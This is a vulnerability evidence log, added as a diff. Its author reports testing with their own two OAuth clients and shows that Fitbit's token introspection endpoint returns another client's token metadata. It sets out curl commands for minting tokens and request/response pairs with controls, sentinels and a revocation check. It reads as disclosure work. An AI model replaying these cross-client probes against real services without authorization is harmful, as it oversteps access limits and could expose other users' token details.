@@ -1,0 +1,111 @@
+================================================================================
+EVIDENCE — Fitbit token introspection does not bind a token to the caller
+Target : https://api.fitbit.com/1.1/oauth2/introspect
+Date   : 2026-10-08, 06:09 and 06:29 UTC
+Tester : external IP 180.148.212.54
+Tool   : curl 8.21.0 (aarch64-unknown-linux-android) OpenSSL/3.6.3
+Note   : every account and every token below is my own. No other user was involved.
+================================================================================
+
+--------------------------------------------------------------------------------
+PART 1 — one application token minted per client, each with its own credentials
+--------------------------------------------------------------------------------
+$ curl -s -X POST https://api.fitbit.com/oauth2/token \
+    -H "Authorization: Basic $(printf '227ZG3:<secret>' | base64 -w0)" \
+    -d 'grant_type=client_credentials'
+  -> access_token for 227ZG3   (205 chars)
+
+$ curl -s -X POST https://api.fitbit.com/oauth2/token \
+    -H "Authorization: Basic $(printf '228TQD:<secret>' | base64 -w0)" \
+    -d 'grant_type=client_credentials'
+  -> access_token for 228TQD   (205 chars)
+
+--------------------------------------------------------------------------------
+PART 2 — can client 228TQD introspect a token belonging to client 227ZG3?
+--------------------------------------------------------------------------------
+[CONTROL]  228TQD introspects its OWN token
+200 {"active":true,"scope":"{}","client_id":"228TQD","token_type":"access_token",
+     "exp":1791468533000,"iat":1791439733000}
+
+[CROSS]    228TQD introspects 227ZG3's token
+200 {"active":true,"scope":"{}","client_id":"227ZG3","token_type":"access_token",
+     "exp":1791468531000,"iat":1791439731000}
+                      ^^^^^^^^ a different client, named by Fitbit in its own reply
+
+[SENTINEL] 228TQD introspects a fabricated token
+200 {"active":false}
+
+Reading: the control shows the endpoint works for a caller's own token. The
+sentinel shows it really validates tokens rather than answering active:true to
+anything. Between them the CROSS result is genuine.
+
+--------------------------------------------------------------------------------
+PART 3 — the same cross-client attempt against revocation is refused
+--------------------------------------------------------------------------------
+[SENTINEL] 228TQD revokes a fabricated token
+404 {"errorType":"invalid_request","message":"Refresh token not found"}
+
+[CROSS]    228TQD revokes 227ZG3's token
+403 {"errorType":"insufficient_permissions",
+     "message":"API client is not authorized by the resource owner to access the
+                resource requested."}
+
+[VERIFY]   227ZG3 introspects its own token afterwards
+200 {"active":true,"scope":"{}","client_id":"227ZG3","token_type":"access_token",
+     "exp":1791468531000,"iat":1791439731000}      <- the token survived
+
+Reading: a 200 from a revocation endpoint would prove nothing on its own, since
+RFC 7009 has them return 200 for unknown tokens. The VERIFY line is what settles
+it: the token was untouched, so revocation IS bound to the owning client.
+
+--------------------------------------------------------------------------------
+PART 4 — how much authority does introspection actually require?
+--------------------------------------------------------------------------------
+[BASELINE] Basic 228TQD, reads 227ZG3's token
+200 {"active":true,"scope":"{}","client_id":"227ZG3","exp":1791469728000,"iat":1791440928000}
+
+[NO AUTH]  no Authorization header at all
+401 {"error":{"code":401,"status":"UNAUTHENTICATED",
+     "message":"Request is missing required authentication credential. Expected
+                OAuth 2 access token, login cookie or other valid authentication
+                credential."}}
+
+[BEARER]   Authorization: Bearer <228TQD's access token>, reads 227ZG3's token
+200 {"active":true,"scope":"{}","client_id":"227ZG3","exp":1791469728000,"iat":1791440928000}
+
+[BEARER]   Authorization: Bearer <the same token being introspected>
+200 {"active":true,"scope":"{}","client_id":"227ZG3","exp":1791469728000,"iat":1791440928000}
+
+[FAKE]     Basic with fabricated credentials
+401 {"errorType":"invalid_client","message":"Invalid authorization header.
+                                             Client id invalid."}
+
+[SENTINEL] Basic 228TQD, fabricated token
+200 {"active":false}
+
+Reading: authentication IS required and fabricated credentials ARE rejected, so
+the endpoint is not simply open. What it never does is compare the token's
+client_id to the authenticated caller. A plain bearer access token is enough,
+which is a far lower bar than holding credentials for two OAuth applications.
+
+--------------------------------------------------------------------------------
+PART 5 — what I could NOT test, stated so it is not mistaken for a negative
+--------------------------------------------------------------------------------
+Both tokens above are APPLICATION tokens, whose scope is empty, so what leaks is
+active / client_id / scope / iat / exp.
+
+Introspection of a USER token normally also returns the user id and the granted
+scopes. I could not test that:
+
+  - minting a user token needs grant_type=password, and every Fitbit account I can
+    create now signs in through Google and has no native Fitbit password. Tried on
+    two accounts; both returned:
+        400 {"errorType":"invalid_grant","message":"Invalid username/password."}
+
+  - registering a third application is no longer possible: dev.fitbit.com/apps/new
+    has its fields disabled and states that registration via that form is
+    discontinued.
+
+If introspecting a user token also returns the user id and scopes, the impact is
+larger than what is demonstrated above.
+================================================================================
